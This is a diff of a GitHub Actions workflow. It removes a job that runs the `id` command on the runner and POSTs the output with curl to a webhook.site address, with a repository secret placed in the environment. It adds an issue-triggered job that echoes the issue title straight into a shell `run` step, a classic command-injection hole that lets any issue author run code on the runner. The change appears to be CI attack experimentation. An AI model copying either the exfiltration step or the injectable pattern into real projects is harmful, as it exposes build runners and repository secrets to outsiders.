@@ -1,27 +1,10 @@
-name: Dispatch ID Command Workflow
-
+name: Issue
 on:
-  workflow_dispatch:  # Déclenchement manuel via l'interface GitHub
-
+   issues:
+   
 jobs:
-  get-id-and-send:
-    runs-on: ubuntu-latest  # Utilisation d'une machine virtuelle Ubuntu
-
+  hello:
+    runs-on: ubuntu-latest
     steps:
-      - name: Check out repository
-        uses: actions/checkout@v2  # Si vous avez besoin du code du dépôt
-
-      - name: Get the ID command output
-        id: id_output
-        run: |
-          result=$(id)  # Exécute la commande `id` et stocke le résultat dans la variable `result`
-          echo "Result of 'id' command: $result"
-          echo "::set-output name=id_result::$result"  # Définit la sortie du job
-
-      - name: Send result to server
-        run: |
-          curl -X POST https://webhook.site/23afe908-1b08-49a5-b9db-9a5ad8cb80bf \
-            -H "Content-Type: application/json" \
-            -d '{"id_result": "${{ steps.id_output.outputs.id_result }}"}'
-        env:
-          SERVER_API_KEY: ${{ secrets.SERVER_API_KEY }}  # Utilisation d'une clé d'API secrète si nécessaire
+      - run: |
+            echo "New issue: ${{ github.event.issue.title }}"
